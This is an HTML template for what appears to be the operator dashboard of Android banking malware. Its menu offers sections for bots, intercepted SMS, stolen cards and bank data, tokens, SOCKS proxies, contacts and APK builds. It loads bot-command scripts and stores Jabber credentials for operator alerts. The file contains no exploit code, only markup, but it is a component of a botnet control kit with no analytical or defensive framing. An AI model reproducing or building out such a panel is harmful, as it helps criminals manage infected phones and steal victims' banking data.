<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta charset="utf-8" />
	<meta http-equiv="Content-Type" content="text/html" />
	<title>admin panel</title>
	<link href="css/bootstrap.css" rel="stylesheet" />
	
	<link href="css/style.css" rel="stylesheet" />
	<link href="css/font-awesome.min.css" rel="stylesheet" />
	<script type="text/javascript" src="js/jquery.min.js"></script>
	<link rel="shortcut icon" href="img/favicon.png" type="image/png" />
	<script type="text/javascript" src="js/admincore.js"></script>
	<script type="text/javascript" src="js/botscmd.js"></script>
	<script type="text/javascript" src="js/botinfocmd.js"></script>
	<script type="text/javascript" src="js/coordinates.js"></script>
	<script type="text/javascript" src="js/messagebox.js"></script>
</head>
<body>
	<div id='loader-div' style='position: fixed; top: 15px; hidden: true1; left: 0; width: 100%; text-align: center; z-index: 999'>
		<img src='img/loader.gif' />
		</div>
	<div id="wrapper">
		<center>
	<!-- Static navbar -->
	<div id="header-back">
	<div id="header">
			<div id="menu">
				<span class="active"><a id="menu-news">News</a></span>
				<span><a id="menu-stat">Stats</a></span>
				<span><a id="menu-bots">Bots</a></span>
				<span><a id="menu-sms">SMS</a></span>
				<span><a id="menu-sork1">Cards</a></span>
				<span><a id="menu-sork">Banks</a></span>
				<span><a id="menu-apps">Apps</a></span>
				<span><a id="menu-contacts">Contacts</a></span>
				<span><a id="menu-socks">Socks</a></span><br>
				<span><a id="menu-tokens">Tokens</a></span>
				<span><a id="menu-coordinates">Coordinates</a></span>
				<span><a id="menu-settings">Settings</a></span>
				<span><a id="menu-apks">APKs</a></span>
				<span><a id="menu-docs">Docs</a></span>                
				<span><a onclick="refreshContent();return false;"><img src='img/refresh.png' style='width: 20px' /></a></span>
			</div>

			<div id="login">
				<div id="login-top">Welcome, {!LOGIN}
				<a id="login-logout" class="navbar-link" title='Logout'><img alt='exit' src='img/logout.png' width='20' /></a>
				</div>
				<input type='hidden' id='jabber_admin_login' value='{!JABBER_ADM_LOGIN}' />
				<input type='hidden' id='jabber_admin_pass' value='{!JABBER_ADM_PASS}' />
				<input type='hidden' id='jabber_admin_port' value='{!JABBER_ADM_PORT}' />
				<input type='hidden' id='jabber_notify' value='{!JABBER}' />
				<div id="login-bottom">
				<a id="login-profile" class="navbar-link">Profile</a> {!REG_NEW}
				</div>
			</div>
	</div>
	<div id="filter"></div>
	</div>
	<div id="content"></div>
	<div id="footer-back">
	<div id="command-bar"></div>
	</div>
	</div>

	<div id="modal" class="infoblock"><div class="caption"><div class="text col-md-8"></div></div><div class="content"></div></div>
	</center>
<br />
<!-- <div id='server_time' style='position: fixed; bottom: 5px; right: 5px; font-size: 9pt; color: black'>Server time {!SERVER_TIME}</div> -->
<br />
<br />
<br />
</body>
</html>
